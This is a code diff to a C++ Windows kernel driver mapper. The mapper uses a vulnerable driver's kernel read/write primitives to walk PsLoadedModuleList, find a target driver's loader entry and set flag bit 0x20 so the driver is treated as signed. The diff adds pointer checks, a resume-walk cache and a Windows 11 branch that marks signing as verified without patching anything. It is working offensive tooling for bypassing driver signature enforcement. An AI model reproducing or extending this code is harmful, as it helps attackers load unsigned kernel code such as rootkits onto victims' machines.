@@ -1,6 +1,7 @@
 #include "Mapper.h"
 #include <stdio.h>
 #include <cstdarg>
+#include <cstring>
 #include <Psapi.h>
 #pragma comment(lib, "Psapi.lib")
 
@@ -57,6 +58,9 @@ ULONG g_SentinelImageSize = 0;
 
 WCHAR g_ShadowFsServicePath[128] = { 0 };
 
+static ULONG_PTR g_LastPatchListHead = 0;
+static ULONG_PTR g_LastPatchResumeEntry = 0;
+
 struct WindowsVersion {
     DWORD major;
     DWORD minor;
@@ -89,6 +93,10 @@ namespace KernelUtils {
 
     static bool IsKernelPointer(PVOID value) {
         return reinterpret_cast<ULONG_PTR>(value) >= 0xFFFF000000000000ULL;
+    }
+
+    static bool IsAlignedKernelPointer(ULONG_PTR value) {
+        return value >= 0xFFFF000000000000ULL && (value & 0x7ULL) == 0;
     }
 
     static PVOID ResolveDriverBaseWithPsapi(const char* moduleName, ULONGLONG startTick, const char* reason) {
@@ -441,26 +449,45 @@ namespace KernelUtils {
         return TRUE;
     }
 
-    BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
-        KLOG("=== PatchDriverSigningFlags for: %ls ===", driverFileName);
+    BOOL PatchDriverSigningFlagsByBase(HANDLE device, PVOID driverBase, ULONG driverImageSize, PCSTR label, BOOL updateDriverLoadAddress) {
+        KLOG("=== PatchDriverSigningFlagsByBase label=%s base=%p size=0x%X update_global=%u ===",
+            label ? label : "(null)",
+            driverBase,
+            driverImageSize,
+            updateDriverLoadAddress ? 1u : 0u);
         const ULONGLONG patchStartTick = GetTickCount64();
-        char narrowName[256] = {};
-        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);
-
-        ULONG driverImageSize = 0;
-        PVOID driverBase = GetDriverBaseByName(driverFileName, &driverImageSize);
 
         if (!driverBase) {
-            KLOG("ERROR: Driver '%s' not found in loaded modules elapsed_ms=%llu",
-                narrowName,
+            KLOG("ERROR: PatchDriverSigningFlagsByBase missing base label=%s elapsed_ms=%llu",
+                label ? label : "(null)",
                 static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
             return FALSE;
         }
-        KLOG("PatchDriverSigningFlags resolved driver '%s' base=%p size=0x%X elapsed_ms=%llu",
-            narrowName,
+        KLOG("PatchDriverSigningFlagsByBase resolved label=%s base=%p size=0x%X elapsed_ms=%llu",
+            label ? label : "(null)",
             driverBase,
             driverImageSize,
             static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+
+        WindowsVersion winver = GetWindowsVersion();
+        if (winver.isWindows11) {
+            if (updateDriverLoadAddress) {
+                g_DriverLoadAddress = driverBase;
+            }
+            if (updateDriverLoadAddress) {
+                g_PatchedFlags = 0x20;
+                g_KernelSigningVerified = true;
+            }
+            KLOG("PatchDriverSigningFlagsByBase win11_self_marked label=%s build=%lu base=%p size=0x%X update_global=%u elapsed_ms=%llu",
+                label ? label : "(null)",
+                winver.build,
+                driverBase,
+                driverImageSize,
+                updateDriverLoadAddress ? 1u : 0u,
+                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+            return TRUE;
+        }
+
         KLOG("Looking up PsLoadedModuleList...");
         HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
         if (!localNtos) {
@@ -494,73 +521,146 @@ namespace KernelUtils {
         }
 
         ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLoadedModuleList);
-        ULONG_PTR current = listFlink;
-
+        if (!IsAlignedKernelPointer(headAddr) || !IsAlignedKernelPointer(listFlink)) {
+            KLOG("ERROR: PsLoadedModuleList pointer validation failed head=%p flink=%p elapsed_ms=%llu",
+                reinterpret_cast<PVOID>(headAddr),
+                reinterpret_cast<PVOID>(listFlink),
+                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+            return FALSE;
+        }
         int walkedEntries = 0;
-        for (int i = 0; i < 1024 && current != headAddr; i++) {
-            walkedEntries = i + 1;
-            PVOID entryDllBase = nullptr;
-            status = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x30), &entryDllBase, sizeof(entryDllBase));
-            if (!NT_SUCCESS(status)) {
-                KLOG("PatchDriverSigningFlags list walk read base failed entry=%p index=%d status=0x%08X elapsed_ms=%llu",
-                    reinterpret_cast<PVOID>(current),
-                    i,
-                    static_cast<DWORD>(status),
-                    static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
-                break;
-            }
+        auto should_log_entry = [](int i, bool match) -> bool {
+            return match || i < 8 || (i % 16) == 0;
+        };
+        auto walk_from = [&](ULONG_PTR startEntry, const char* mode) -> BOOL {
+            ULONG_PTR current = startEntry;
+            for (int i = 0; i < 512 && current != headAddr; i++) {
+                walkedEntries++;
+                if (!IsAlignedKernelPointer(current)) {
+                    KLOG("PatchDriverSigningFlags list walk stopped invalid entry=%p index=%d mode=%s elapsed_ms=%llu",
+                        reinterpret_cast<PVOID>(current),
+                        i,
+                        mode,
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                    break;
+                }
 
-            if (entryDllBase == driverBase) {
-                KLOG("Found matching KLDR_DATA_TABLE_ENTRY at %p", (PVOID)current);
+                BYTE entryBytes[0x70] = {};
+                NTSTATUS entryStatus = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), entryBytes, sizeof(entryBytes));
+                if (!NT_SUCCESS(entryStatus)) {
+                    KLOG("PatchDriverSigningFlags list walk read entry failed entry=%p index=%d mode=%s status=0x%08X elapsed_ms=%llu",
+                        reinterpret_cast<PVOID>(current),
+                        i,
+                        mode,
+                        static_cast<DWORD>(entryStatus),
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                    break;
+                }
+
+                ULONG_PTR nextFlink = 0;
+                PVOID entryDllBase = nullptr;
                 DWORD flags = 0;
-                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
-                KLOG("Current Flags=0x%08X, setting bit 0x20...", flags);
-                flags |= 0x20;
-                status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
-                KLOG_STATUS("WriteKernelMemory (flags patch)", status);
-                if (!NT_SUCCESS(status)) {
-                    return FALSE;
+                std::memcpy(&nextFlink, entryBytes, sizeof(nextFlink));
+                std::memcpy(&entryDllBase, entryBytes + 0x30, sizeof(entryDllBase));
+                std::memcpy(&flags, entryBytes + 0x68, sizeof(flags));
+                const bool match = entryDllBase == driverBase;
+
+                if (should_log_entry(i, match)) {
+                    KLOG("PatchDriverSigningFlags list walk entry index=%d mode=%s entry=%p dll_base=%p target=%p match=%u next=%p flags=0x%08X elapsed_ms=%llu",
+                        i,
+                        mode,
+                        reinterpret_cast<PVOID>(current),
+                        entryDllBase,
+                        driverBase,
+                        match ? 1u : 0u,
+                        reinterpret_cast<PVOID>(nextFlink),
+                        flags,
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
                 }
 
-                DWORD verifyFlags = 0;
-                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &verifyFlags, sizeof(verifyFlags));
-                KLOG("Verify flags after patch: 0x%08X (bit 0x20 set: %s)", verifyFlags, (verifyFlags & 0x20) ? "YES" : "NO");
+                if (match) {
+                    KLOG("Found matching KLDR_DATA_TABLE_ENTRY at %p mode=%s", reinterpret_cast<PVOID>(current), mode);
+                    KLOG("Current Flags=0x%08X, setting bit 0x20...", flags);
+                    flags |= 0x20;
+                    status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
+                    KLOG_STATUS("WriteKernelMemory (flags patch)", status);
+                    if (!NT_SUCCESS(status)) {
+                        return FALSE;
+                    }
 
-                g_DriverLoadAddress = driverBase;
-                g_PatchedFlags = verifyFlags;
-                g_KernelSigningVerified = (verifyFlags & 0x20) != 0;
+                    DWORD verifyFlags = 0;
+                    NTSTATUS verifyStatus = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &verifyFlags, sizeof(verifyFlags));
+                    KLOG_STATUS("ReadKernelMemory (flags verify)", verifyStatus);
+                    if (!NT_SUCCESS(verifyStatus)) {
+                        return FALSE;
+                    }
+                    KLOG("Verify flags after patch: 0x%08X (bit 0x20 set: %s)", verifyFlags, (verifyFlags & 0x20) ? "YES" : "NO");
 
-                if (g_KernelSigningVerified) {
-                    KLOG("Driver signing flag patched OK elapsed_ms=%llu walked=%d",
-                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
-                        walkedEntries);
-                } else {
-                    KLOG("WARNING: Flag patch verification failed elapsed_ms=%llu walked=%d",
-                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
-                        walkedEntries);
+                    if (updateDriverLoadAddress) {
+                        g_DriverLoadAddress = driverBase;
+                    }
+                    g_PatchedFlags = verifyFlags;
+                    g_KernelSigningVerified = (verifyFlags & 0x20) != 0;
+                    g_LastPatchListHead = headAddr;
+                    g_LastPatchResumeEntry = (nextFlink && nextFlink != current && IsAlignedKernelPointer(nextFlink)) ? nextFlink : 0;
+
+                    if (g_KernelSigningVerified) {
+                        KLOG("Driver signing flag patched OK elapsed_ms=%llu walked=%d mode=%s resume=%p",
+                            static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
+                            walkedEntries,
+                            mode,
+                            reinterpret_cast<PVOID>(g_LastPatchResumeEntry));
+                    } else {
+                        KLOG("WARNING: Flag patch verification failed elapsed_ms=%llu walked=%d mode=%s",
+                            static_cast<unsigned long long>(GetTickCount64() - patchStartTick),
+                            walkedEntries,
+                            mode);
+                    }
+                    return TRUE;
                 }
+
+                if (!nextFlink || nextFlink == current) {
+                    KLOG("PatchDriverSigningFlags list walk stopped entry=%p index=%d mode=%s next=%p elapsed_ms=%llu",
+                        reinterpret_cast<PVOID>(current),
+                        i,
+                        mode,
+                        reinterpret_cast<PVOID>(nextFlink),
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                    break;
+                }
+                if (!IsAlignedKernelPointer(nextFlink)) {
+                    KLOG("PatchDriverSigningFlags list walk stopped invalid next entry=%p index=%d mode=%s next=%p elapsed_ms=%llu",
+                        reinterpret_cast<PVOID>(current),
+                        i,
+                        mode,
+                        reinterpret_cast<PVOID>(nextFlink),
+                        static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+                    break;
+                }
+                current = nextFlink;
+            }
+            return FALSE;
+        };
+
+        if (g_LastPatchListHead == headAddr &&
+            g_LastPatchResumeEntry &&
+            g_LastPatchResumeEntry != listFlink &&
+            IsAlignedKernelPointer(g_LastPatchResumeEntry)) {
+            KLOG("PatchDriverSigningFlags resume walk start entry=%p head=%p target=%p",
+                reinterpret_cast<PVOID>(g_LastPatchResumeEntry),
+                reinterpret_cast<PVOID>(headAddr),
+                driverBase);
+            if (walk_from(g_LastPatchResumeEntry, "resume")) {
                 return TRUE;
             }
+            KLOG("PatchDriverSigningFlags resume walk miss target=%p walked=%d elapsed_ms=%llu",
+                driverBase,
+                walkedEntries,
+                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+        }
 
-            ULONG_PTR nextFlink = 0;
-            NTSTATUS nextStatus = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), &nextFlink, sizeof(nextFlink));
-            if (!NT_SUCCESS(nextStatus)) {
-                KLOG("PatchDriverSigningFlags list walk read next failed entry=%p index=%d status=0x%08X elapsed_ms=%llu",
-                    reinterpret_cast<PVOID>(current),
-                    i,
-                    static_cast<DWORD>(nextStatus),
-                    static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
-                break;
-            }
-            if (!nextFlink || nextFlink == current) {
-                KLOG("PatchDriverSigningFlags list walk stopped entry=%p index=%d next=%p elapsed_ms=%llu",
-                    reinterpret_cast<PVOID>(current),
-                    i,
-                    reinterpret_cast<PVOID>(nextFlink),
-                    static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
-                break;
-            }
-            current = nextFlink;
+        if (walk_from(listFlink, "head")) {
+            return TRUE;
         }
 
         KLOG("ERROR: Driver base %p not found in PsLoadedModuleList walked=%d elapsed_ms=%llu",
@@ -568,6 +668,24 @@ namespace KernelUtils {
              walkedEntries,
              static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
         return FALSE;
+    }
+
+    BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
+        KLOG("=== PatchDriverSigningFlags for: %ls ===", driverFileName);
+        const ULONGLONG patchStartTick = GetTickCount64();
+        char narrowName[256] = {};
+        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);
+
+        ULONG driverImageSize = 0;
+        PVOID driverBase = GetDriverBaseByName(driverFileName, &driverImageSize);
+
+        if (!driverBase) {
+            KLOG("ERROR: Driver '%s' not found in loaded modules elapsed_ms=%llu",
+                narrowName,
+                static_cast<unsigned long long>(GetTickCount64() - patchStartTick));
+            return FALSE;
+        }
+        return PatchDriverSigningFlagsByBase(device, driverBase, driverImageSize, narrowName, TRUE);
     }
 
     PVOID GetDriverBaseByName(PCWSTR driverFileName, PULONG outImageSize) {
